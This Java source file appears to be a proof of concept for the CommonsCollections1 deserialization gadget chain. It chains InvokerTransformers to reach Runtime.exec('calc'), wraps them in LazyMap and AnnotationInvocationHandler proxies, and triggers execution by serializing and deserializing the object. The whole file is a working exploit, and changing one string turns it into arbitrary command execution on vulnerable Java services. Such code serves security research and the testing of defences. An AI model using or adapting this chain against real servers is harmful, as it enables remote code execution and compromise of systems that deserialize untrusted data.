import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.*;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class CC1 { // NOTE: JDK 7, commons-collections:3.1
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}),
                new ConstantTransformer(1)};

        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map lmap = LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor aihCtor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                .getDeclaredConstructors()[0];
        aihCtor.setAccessible(true);
        InvocationHandler ih = (InvocationHandler) aihCtor.newInstance(Override.class, lmap);
//        setFinalField(ih, "memberValues", lmap);

//        System.out.println(getFinalField(ih, "memberValues"));

        Map proxyMap = Map.class.cast(Proxy.newProxyInstance(lmap.getClass().getClassLoader(), lmap.getClass().getInterfaces(), ih));
        InvocationHandler ih_2 = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);

        ByteArrayOutputStream serializedData = serialize(ih_2);
        deserialize(serializedData);
    }

    static ByteArrayOutputStream serialize(Object object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        return baos;
    }

    static void deserialize(ByteArrayOutputStream baos) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }

    static void setFinalField(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            field.set(obj, value);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    static Object getFinalField(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            return field.get(obj);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    static Object getFieldValue(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            return field.get(obj);

        } catch (Exception e) {
            System.out.println(e);
            return e;
        }

    }

    static void setFieldValue(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.set(obj, value);

        } catch (Exception e) {
            System.out.println(e);
        }

    }
}
